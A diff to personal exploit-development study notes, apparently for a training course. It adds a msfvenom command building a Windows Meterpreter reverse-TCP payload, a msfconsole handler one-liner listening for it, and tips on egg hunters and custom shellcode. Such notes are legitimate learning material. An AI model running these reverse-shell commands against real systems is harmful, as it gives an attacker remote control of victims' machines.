@@ -57,6 +57,8 @@ Linux cmds:
 
 2. 	msf-nasm_shell
 
+3. a: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=443 -f python -v  payload
+   b: sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.119.120; set LPORT 443; exploit"
 	
 ---------------------------------------
 
@@ -79,10 +81,18 @@ m-6 (Savant):
 		Keystone Engine: embed assembly code in python poc, not using hex code directly.
 		python: from keystone import *
 		issue to combat: no way of telling beforehand if a memory page is mapped
-			use NtAccessCheckAndAuditAlarm: https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FSecurity%2FNtAccessCheckAndAuditAlarm.html
+			use NtAccessCheckAndAuditAlarm (system call did not change until Windows 8)
+			ref: https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FSecurity%2FNtAccessCheckAndAuditAlarm.html
 			if has access: return STATUS_NO_IMPERSONATION_TOKEN
 			if not: STATUS_ACCESS_VIOLATION 
+	8. reverse shell: msfvenom
+	9. because NtAccessCheckAndAuditAlarm system call chages by Windows version, use SEH egg hunter.
+
+---------------------------------------
+
+m-7 Custom Shellcode (t !!)
+	ctype & keystone, make windows api calls
 	
-		
+
 
 ---------------------------------------
